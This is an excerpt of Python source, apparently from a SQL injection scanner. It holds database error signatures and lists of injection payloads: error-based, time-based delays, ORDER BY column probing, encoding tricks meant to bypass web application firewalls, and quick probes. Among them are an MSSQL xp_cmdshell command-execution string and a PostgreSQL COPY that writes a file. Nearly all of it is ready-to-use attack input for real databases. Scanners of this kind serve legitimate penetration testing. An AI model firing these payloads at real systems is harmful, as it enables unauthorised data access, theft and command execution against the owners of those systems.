...
DB_ERROR_PATTERNS: Dict[str, List[str]] = {
    "mysql": [
        ...
        "MySqlException", "mysql_num_rows", "mysql_fetch",
        "check the manual that corresponds to your MySQL server",
        "Unknown column", "You have an error in your SQL syntax",
    ...
    "oracle": [
        "ORA-[0-9]{5}", "Oracle error", "Oracle.*Driver",
        "Warning.*oci_", "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite/JDBCDriver", "SQLite.Exception",
        "System.Data.SQLite.SQLiteException", "sqlite3.OperationalError",
    ],
}
...
ERROR_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        ...
        "'/**/OR/**/1=1--", "'+OR+1=1--", "'%09OR%091=1--",
        "'%0AOR%0A1=1--", "' oR 1=1--", "'/**/UnIoN/**/SeLeCt/**/1,2,3--",
    ],
    "postgresql": [
        "'", "\"", "1'", "1\"",
        "' OR 1=1--", "' OR 'a'='a",
        ...
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; SELECT pg_sleep(3)--", "'; COPY (SELECT '') TO '/tmp/test'--",
    ],
    "mssql": [
        "'", "\"", "1'", "1\"",
        "' OR 1=1--", "' OR 'a'='a",
        ...
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "'; WAITFOR DELAY '0:0:3'--", "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    ],
    "oracle": [
        "'", "\"", "1'", "1\"",
...
TIME_BASED_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' AND SLEEP(3)--", "'; SELECT SLEEP(3)--", "' UNION SELECT SLEEP(3)--",
        "') AND SLEEP(3)--", "\") AND SLEEP(3)--",
        "') AND SLEEP(3)#", "' AND SLEEP(5)--", "'; SELECT SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "'/**/AND/**/SLEEP(3)--", "'+AND+SLEEP(3)--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(3)--", "'; SELECT pg_sleep(5)--", "'||pg_sleep(3)--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:3'--", "'; WAITFOR DELAY '0:0:5'--",
    ],
    "oracle": [
        "'; BEGIN dbms_lock.sleep(3); END;--", "'; BEGIN dbms_lock.sleep(5); END;--",
    ],
    "sqlite": [
...
ORDER_BY_PAYLOADS: List[str] = [
    ...
    "' ORDER BY 5--", "' ORDER BY 10--", "' ORDER BY 20--",
    "' ORDER BY 50--", "' ORDER BY 100--",
    "') ORDER BY 1--", "') ORDER BY 3--",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "'/**/OR/**/1=1--", "'/**/AND/**/1=1--", "'/**/UNION/**/SELECT/**/1,2,3--",
    "'+OR+1=1--", "'%09OR%091=1--", "'%0AOR%0A1=1--", "'%0DOR%0D1=1--",
    "'%0COR%0C1=1--", "'%A0OR%A01=1--",
    "' oR 1=1--", "' Or 1=1--", "' OR true--", "' || 1=1--",
    "' OR 1 LIKE 1--", "' OR 1 BETWEEN 1 AND 1--",
    "1%00' AND 1=1--", "%2527%20OR%201=1--",
...
QUICK_PAYLOADS: List[str] = [
    ...
    "' AND 1=1--", "' AND 1=2--", "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--", "' AND SLEEP(3)--", "' ORDER BY 1--",
    # P9: Numeric context quick payloads
    " AND 1=1", " AND 1=2", " OR 1=1", "-1 OR 1=1",
]
